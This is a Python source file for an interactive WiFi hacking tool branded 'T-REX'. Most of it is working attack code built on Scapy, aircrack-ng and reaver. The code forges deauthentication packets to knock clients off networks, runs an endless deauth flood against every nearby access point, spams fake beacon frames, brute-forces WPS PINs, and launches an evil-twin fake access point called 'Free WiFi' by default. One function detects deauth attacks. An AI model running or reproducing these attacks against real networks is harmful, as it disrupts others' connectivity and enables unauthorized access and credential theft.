import pyfiglet
import colorama
from colorama import Fore, init, Style, Back
import os
import time
import subprocess
from scapy.all import *
from threading import Thread
from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11Beacon, RadioTap
import random

def beacon_spamm(interface, ssid_list, num_beacons=100, interval=0.1):
    try:
        for _ in range(num_beacons):
            for ssid in ssid_list:
                mac = "00:11:22:33:44:" + f"{random.randint(0, 255):02x}"
                channel = random.randint(1, 11)
                packet = (
                    RadioTap() /
                    Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac) /
                    Dot11Beacon(cap="ESS") /
                    Dot11Elt(ID="SSID", info=ssid.encode()) /
                    Dot11Elt(ID="Rates", info="\x02\x04\x0b\x16") /
                    Dot11Elt(ID="DSset", info=chr(channel).encode())
                )
                sendp(packet, iface=interface, verbose=0)
                time.sleep(interval)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nBeacon attack stopped.")
    except Exception as e:
        print(f"Error sending Beacon packets: {e}")

def get_ssid_input():
    print("Do you want to use a predefined list or customize SSIDs?")
    print("1. Predefined list")
    print("2. Custom list")
    choice = input("Choose 1 or 2: ")
    if choice == "1":
        return ["SSID1", "SSID2", "SSID3", "MyFakeNetwork"], False
    elif choice == "2":
        custom_ssids = input("Enter SSIDs separated by commas: ").split(',')
        return [ssid.strip() for ssid in custom_ssids], True
    else:
        print("Invalid option. Using predefined list.")
        return ["SSID1", "SSID2", "SSID3", "MyFakeNetwork"], False

def deauth_detect(interface):
    print(f"[*] Detecting deauthentication attacks on {interface}...")
    current_channel = 1
    stop_hopping = False

    def change_channel(channel):
        subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.BLUE}>>>[*] Changing channel: {channel}")

    def packet_handler(pkt):
        nonlocal stop_hopping, current_channel
        if pkt.haslayer(Dot11Deauth):
            try:
                sender = pkt.addr2
                receiver = pkt.addr1
                reason = pkt[Dot11Deauth].reason
                print(f"{Fore.RED}{Style.BRIGHT}>>>[ALERT] Deauth detected! Source: {sender}, Destination: {receiver}, Reason: {reason}, Channel: {current_channel}")
                stop_hopping = True
            except Exception as e:
                print(f"{Fore.RED}Error reading a packet: {e}")

    try:
        while True:
            if not stop_hopping:
                change_channel(current_channel)
                current_channel = current_channel + 1 if current_channel < 13 else 1
            else:
                print(f"{Fore.GREEN}>>>[INFO] Attack detected, staying on channel {current_channel}")
            sniff(iface=interface, prn=packet_handler, timeout=2, store=False)
    except KeyboardInterrupt:
        print(">>>[*] Detection stopped.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Problem during execution: {e}")

def check_tool(tool_name):
    global tools_missing
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Checking tool {tool_name}.... installed!")
    except FileNotFoundError:
        print(f"{Fore.RED}Checking tool {tool_name}.... not installed!")
        tools_missing.append(tool_name)

tools = ['reaver', 'aircrack-ng', 'wireshark','tcpdump']
tools_missing = []

def clear_console():
    os.system("clear" if os.name == "posix" else "cls")

def ascii_animation():
    arts = [
        pyfiglet.figlet_format("T-REX", font="slant"),
        pyfiglet.figlet_format("WiFi Hacking Tool", font="standard"),
        pyfiglet.figlet_format("By @mnesia-Code", font="slant")
    ]
    colors = [Fore.RED, Fore.CYAN, Fore.GREEN, Fore.YELLOW, Fore.MAGENTA]
    clear_console()
    for art in arts:
        for line in art.splitlines():
            print(colors[arts.index(art) % len(colors)] + line)
            time.sleep(0.05)
        time.sleep(1)
        clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Checking required software...\n")
    time.sleep(1)

def list_interfaces():
    clear_console()
    print(Fore.CYAN + "Searching for available network interfaces...")
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True).stdout
    interfaces = [line.split()[0] for line in result.splitlines() if "IEEE" in line]
    if not interfaces:
        print(Fore.RED + "No WiFi interface detected.")
        exit()
    print(Fore.YELLOW + "Available interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(Fore.GREEN + f"{i} => {iface}")
    choice = int(input(Fore.CYAN + "Choose an interface: ")) - 1
    return interfaces[choice]

def check_monitor_mode(interface):
    return interface + "mon" if "mon" not in interface else interface.replace("mon", "")

def put_interface_in_monitor_mode(interface):
    monitor_interface = check_monitor_mode(interface)
    print(Fore.GREEN + Style.BRIGHT + f"Switching {interface} to monitor mode...")
    subprocess.run(["airmon-ng", "start", interface], check=False)
    return monitor_interface

def put_interface_in_normal_mode(interface):
    normal_interface = check_monitor_mode(interface)
    print(Fore.GREEN + Style.BRIGHT + f"Switching {interface} to normal mode...")
    subprocess.run(["airmon-ng", "stop", normal_interface], check=False)
    return normal_interface

def scan_networks(interface):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Scanning WiFi networks on {interface}...")
    networks = {}
    channels = range(1, 14)

    def change_channel(channel):
        subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def packet_handler(pkt):
        try:
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info else "Hidden"
                channel = int(ord(pkt[Dot11Elt:3].info))
                if bssid not in networks:
                    networks[bssid] = {"SSID": ssid, "Channel": channel}
                    print(Fore.YELLOW + f"[{len(networks)}] SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
        except Exception as e:
            print(Fore.RED + f"Error processing a packet: {e}")

    for channel in channels:
        change_channel(channel)
        print(Fore.GREEN + f" >>>Switching to channel {channel}...")
        sniff(iface=interface, prn=packet_handler, timeout=2)

    if not networks:
        print(Fore.RED + Style.BRIGHT + "No networks detected.")
        return None

    print(Fore.GREEN + Style.BRIGHT + "Select a network:")
    for i, (bssid, data) in enumerate(networks.items(), 1):
        print(Fore.CYAN + f"{i} => {data['SSID']} (BSSID: {bssid}, Channel: {data['Channel']})")

    try:
        choice = int(input(Fore.CYAN + "Enter the network number: ")) - 1
        selected_bssid = list(networks.keys())[choice]
        print(Fore.YELLOW + f"Network info:\nSSID: {networks[selected_bssid]['SSID']}\nBSSID: {selected_bssid}\nChannel: {networks[selected_bssid]['Channel']}")
        print("Returning to main menu in 10 seconds...")
        time.sleep(10)
        return networks[selected_bssid]["SSID"], selected_bssid, networks[selected_bssid]["Channel"]
    except (ValueError, IndexError):
        print(Fore.RED + "Invalid choice.")
        return None

def sniff_all_networks(interface):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Sniffing networks on {interface}...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info else "Hidden"
            print(Fore.YELLOW + f"SSID: {ssid}, BSSID: {bssid}")

    print(Fore.GREEN + "Press Ctrl+C to stop sniffing...")
    try:
        sniff(iface=interface, prn=packet_handler)
    except KeyboardInterrupt:
        print(Fore.RED + "\nSniffing stopped.")

def sniff_single_network(interface, bssid):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Sniffing network {bssid} on {interface}...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            print(Fore.YELLOW + f"Packet received from {pkt[Dot11].addr2}")

    print(Fore.GREEN + "Press Ctrl+C to stop sniffing...")
    try:
        sniff(iface=interface, prn=packet_handler)
    except KeyboardInterrupt:
        print(Fore.RED + "\nSniffing stopped.")

def deauth_attack(interface):
    network = scan_networks(interface)
    if not network:
        print(Fore.RED + "No network selected.")
        return

    ssid, bssid, channel = network
    print(Fore.RED + f"Launching deauthentication attack on {ssid} (BSSID: {bssid})...")
    target = input(Fore.CYAN + "Enter target MAC address (or leave empty for all targets): ")
    if not target:
        target = "ff:ff:ff:ff:ff:ff"

    def deauth_pkt():
        pkt = RadioTap() / Dot11(
            addr1=target,
            addr2=bssid,
            addr3=bssid
        ) / Dot11Deauth(reason=7)
        return pkt

    try:
        for i in range(100):
            sendp(deauth_pkt(), iface=interface, count=10, inter=0.1, verbose=False)
            print(Fore.GREEN + f">>>Sending packets... >>> {i * 10}")
    except KeyboardInterrupt:
        print(Fore.RED + "\nAttack stopped.")

def wps_bruteforce(interface):
    network = scan_networks(interface)
    if not network:
        print(Fore.RED + "No network selected.")
        return

    ssid, bssid, channel = network
    print(Fore.RED + Style.BRIGHT + f"Launching WPS bruteforce attack (with reaver) on {ssid} (BSSID: {bssid})...")
    try:
        subprocess.run(["reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-vv"], check=False)
    except KeyboardInterrupt:
        print(Fore.RED + "WPS bruteforce canceled.")

def evil_twin_menu(interface):
    clear_console()
    print(Fore.YELLOW + "Evil Twin Attack Menu")
    print(Fore.GREEN + "1. Configure a fake access point")
    print(Fore.GREEN + "99. Return to main menu")
    choice = input(Fore.CYAN + "Choose an option: ")
    if choice == "1":
        name = input("Enter the fake WiFi name: ")
        if name == "":
            print("No name entered. WiFi will be called 'Free WiFi'")
            name = "Free WiFi"
        print(Fore.RED + "Creating evil twin =>", name)
        subprocess.run(["airbase-ng", "-e", name, interface], check=False)
    elif choice == "99":
        return
    else:
        print(Fore.RED + "Invalid option.")

def deauth_flood_all(interface):
    print(Fore.RED + "Launching Deauth Flood attack on all detected WiFi networks...")
    networks = {}
    channels = range(1, 14)

    def change_channel(channel):
        subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if bssid not in networks:
                networks[bssid] = True
                print(Fore.YELLOW + f"AP detected: BSSID {bssid}")

    for channel in channels:
        change_channel(channel)
        sniff(iface=interface, prn=packet_handler, timeout=1)

    if not networks:
        print(Fore.RED + "No networks detected for the attack.")
        return

    try:
        while True:
            for bssid in networks.keys():
                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                sendp(pkt, iface=interface, count=200, inter=0.1, verbose=False)
                print(Fore.GREEN + Back.BLACK + Style.BRIGHT + f">>> Sending 200 deauth packets to BSSID {bssid}")
    except KeyboardInterrupt:
        print(Fore.RED + "\nDeauth Flood stopped.")

def main_menu(interface):
    while True:
        clear_console()
        choice = input(
            Fore.BLUE +
            "   Main Menu!\n"
            "   >>> 0 => Switch interface to monitor mode\n"
            "   >>> 00=> Switch interface to normal mode\n"
            "   >>> 1 => Scan WiFi networks\n"
            "   >>> 2 => Attempt WPS bruteforce (=> With reaver)\n"
            "   >>> 3 => Evil Twin Menu\n"
            "   >>> 4 => Deauth attack\n"
            "   >>> 5 => Sniff all networks (=> With Scapy)\n"
            "   >>> 6 => Sniff a single network (=> With Scapy)\n"
            "   >>> 7 => Advanced sniffing (Tcpdump / Wireshark / Airodump-ng)\n"
            "   >>> 8 => Deauth flood (=> Sending deauth packets to all WiFi on all channels)\n"
            "   >>> 9 => Detect deauth attacks\n"
            "   >>> 10 => Spam fake WiFi names (beacons spam)\n"
            "   >>> 99 => Quit" + Fore.GREEN + Style.BRIGHT + Back.BLACK + "\n[CHOICE]>>> ")
        if choice == "0":
            interface = put_interface_in_monitor_mode(interface)
        elif choice == "00":
            interface = put_interface_in_normal_mode(interface)
        elif choice == "1":
            print("Starting scan...")
            time.sleep(2)
            clear_console()
            scan_network = scan_networks(interface)
        elif choice == "2":
            wps_bruteforce(interface)
        elif choice == "3":
            evil_twin_menu(interface)
        elif choice == "4":
            deauth_attack(interface)
        elif choice == "5":
            sniff_all_networks(interface)
        elif choice == "6":
            ssid, bssid, channel = scan_networks(interface)
            if bssid:
                sniff_single_network(interface, bssid)
        elif choice == "7":
            print(Fore.GREEN + Style.BRIGHT + "Loading Sniffing menu [+]...")
            time.sleep(1)
            os.system("clear")
            menu2 = input(Fore.BLUE + Style.BRIGHT + "Choose the tool for sniffing:\n1 => Wireshark\n2 => Tcpdumpn\n3 => Airodump-ng\n[choice]>>> ")
            if menu2 == "1":
                print(Fore.RED + "Starting...")
                time.sleep(1)
                subprocess.run(["wireshark","-i",interface])
            elif menu2 == "2":
                print(Fore.RED + "Starting...")
                time.sleep(1)
                subprocess.run(["tcpdump","-i",interface])
            elif menu2 == "3":
                print(Fore.RED + "Starting...")
                time.sleep(1)
                subprocess.run(["airodump-ng",interface])
        elif choice == "8":
            os.system("clear")
            print(Fore.RED + Back.BLACK + "Starting...")
            time.sleep(1)
            deauth_flood_all(interface)
        elif choice == "9":
            print("Starting monitoring...")
            time.sleep(1)
            deauth_detect(interface)
        elif choice == "10":
            print("Loading...")
            time.sleep(2)
            clear_console()
            ssid_list, _ = get_ssid_input()
            g = int(input("Enter the number of names to spam: "))
            l = float(input("Enter the interval time between spams: "))
            print("Loading...")
            beacon_spamm(interface, ssid_list, g, l)
        elif choice == "99":
            print(Fore.GREEN + "Goodbye!")
            break
        else:
            print(Fore.RED + Style.BRIGHT + "Invalid choice. Please try again.")

def main():
    init(autoreset=True)
    ascii_animation()
    print("Checking required tools...")
    for tool in tools:
        check_tool(tool)
        time.sleep(0.5)
    if tools_missing:
        print(Fore.YELLOW + "The following tools are missing:")
        for missing in tools_missing:
            print(Fore.RED + f"- {missing}")
        time.sleep(5)
        exit()
    interface = list_interfaces()
    main_menu(interface)

if __name__ == "__main__":
    main()
